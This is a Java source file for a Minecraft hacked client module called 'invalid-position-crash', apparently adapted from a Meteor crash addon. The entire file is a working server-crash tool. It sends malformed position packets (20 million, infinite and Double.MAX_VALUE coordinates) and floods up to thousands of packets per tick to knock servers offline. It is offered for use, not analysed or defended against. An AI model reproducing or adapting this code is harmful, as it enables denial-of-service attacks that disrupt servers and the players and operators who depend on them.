package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.entity.player.PlayerMoveEvent;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.mixininterface.IVec3d;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/*/-----------------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                                          /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/InvalidPositionCrash.java /*/
/*/-----------------------------------------------------------------------------------------------------------------------------------/*/

public class InvalidPositionCrash extends Module {
    private boolean switching = false;

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // General

    private final Setting<Mode> packetMode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which position crash to use.")
        .defaultValue(Mode.Twenty_Million)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(500)
        .min(1)
        .sliderRange(1, 10000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public InvalidPositionCrash() {
        super(Categories.Crash, Items.COMMAND_BLOCK, "invalid-position-crash", "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
    }

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            switch (packetMode.get()) {
                case Twenty_Million -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20_000_000, 255, 20_000_000, true));
                    toggle();
                }

                case Infinity -> {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    toggle();
                }

                case TP -> mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
            }
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        switch (packetMode.get()) {
            case TP -> {
                for (double i = 0; i < amount.get(); i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * 9), mc.player.getZ(), true));
                }
                for (double i = 0; i < amount.get() * 10; i++) {
                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9), true));
                }
            }
            case Velt -> {
                if (mc.player.age < 100) {
                    for (int i = 0; i < amount.get(); i++) {
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), Double.MAX_VALUE, mc.player.getZ(), false));
                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
                    }
                }
            }
        }
    }

    @EventHandler
    private void onMove(PlayerMoveEvent event) {
        if (Utils.canUpdate()) {
            if (packetMode.get() == Mode.Switch) {
                if (switching) {
                    ((IVec3d) event.movement).set(Double.MIN_VALUE, event.movement.getY(), Double.MIN_VALUE);
                    switching = false;
                } else {
                    ((IVec3d) event.movement).set(Double.MAX_VALUE, event.movement.getY(), Double.MAX_VALUE);
                    switching = true;
                }
            }
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    public enum Mode {
        Twenty_Million("Twenty Million"),
        Infinity("Infinity"),
        TP("TP"),
        Velt("Velt"),
        Switch("Switch");

        private final String title;

        Mode(String title) {
            this.title = title;
        }

        @Override
        public String toString() {
            return title;
        }
    }
}
